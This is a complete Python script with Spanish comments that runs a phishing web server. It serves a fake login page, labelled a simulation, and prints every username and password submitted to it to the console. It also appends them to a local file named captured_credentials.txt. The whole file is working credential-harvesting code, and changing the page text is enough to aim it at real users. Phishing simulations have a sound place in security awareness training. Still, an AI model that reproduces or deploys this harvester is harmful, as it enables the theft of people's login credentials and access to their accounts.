import http.server
import socketserver
import urllib.parse
import os

# HTML de la página de phishing falsa
PHISHING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Inicio de Sesión - Simulación</title>
</head>
<body>
    <h1>Simulación de Página de Inicio de Sesión</h1>
    <form method="POST" action="/login">
        <label>Usuario: </label><input type="text" name="username"><br>
        <label>Contraseña: </label><input type="password" name="password"><br>
        <input type="submit" value="Iniciar Sesión">
    </form>
</body>
</html>
"""

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(PHISHING_PAGE.encode())

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode()
        params = urllib.parse.parse_qs(post_data)
        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]
        print(f"[+] Credenciales capturadas: Usuario={username}, Contraseña={password}")
        with open("captured_credentials.txt", "a") as f:
            f.write(f"Usuario: {username}, Contraseña: {password}\n")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Credenciales enviadas (simulacion).")

def main():
    PORT = 8000
    print(f"[*] Iniciando servidor de phishing en http://localhost:{PORT}")
    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("[*] Servidor detenido")
            httpd.server_close()

if __name__ == "__main__":
    main()
